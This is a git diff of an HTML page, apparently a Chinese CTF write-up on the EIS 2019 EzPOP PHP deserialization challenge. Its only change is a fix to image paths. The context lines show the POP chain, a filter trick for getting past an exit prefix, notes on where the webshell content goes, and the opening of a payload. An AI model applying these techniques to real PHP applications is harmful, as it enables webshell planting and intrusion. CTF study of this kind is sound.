@@ -761,13 +761,13 @@ var_dump($cachedProperties);
 </ul>
 <p>第一步，先找哪里能输出flag或执行代码的地方。</p>
 <p>很明显，在这里了。</p>
-<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-EIS-2019-EzPOP/image-20210817165436129.png"></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-EIS-2019-EzPOP/image-20210817165436129.png"></p>
 <p>大致pop链如下：</p>
 <pre class="line-numbers language-none"><code class="language-none">B::set() &lt;- A::save() &lt;- A::__destruct()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>然后得具体构造了</p>
 <p>先看这里：</p>
-<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-EIS-2019-EzPOP/image-20210817171544413.png"></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-EIS-2019-EzPOP/image-20210817171544413.png"></p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'abcd'</span><span class="token punctuation">;</span>
 <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%012d'</span><span class="token punctuation">,</span> <span class="token variable">$expire</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">echo</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
@@ -813,7 +813,7 @@ file_put_contents($filename, $data);<span aria-hidden="true" class="line-numbers
 <pre class="line-numbers language-none"><code class="language-none">php&#x2F;&#x2F;123456789123exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>然后这里的$contents就是放webshell的地方，这有两个选择，一是从<code>$cleaned</code>取，一是从<code>$complete</code>里取。明显从<code>$complete</code>里取要简单点，所以这里可以让<code>$cleaned</code>为空或空数组即可。</p>
-<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-EIS-2019-EzPOP/image-20210817221009582.png"></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-EIS-2019-EzPOP/image-20210817221009582.png"></p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'MTIzNDU='</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token comment">//$a = json_encode(['', 'MTIzNDU=']);</span>
@@ -821,7 +821,7 @@ file_put_contents($filename, $data);<span aria-hidden="true" class="line-numbers
 <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span>
 <span class="token keyword">echo</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-EIS-2019-EzPOP/image-20210817221607606.png"></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-EIS-2019-EzPOP/image-20210817221607606.png"></p>
 <p>payload</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
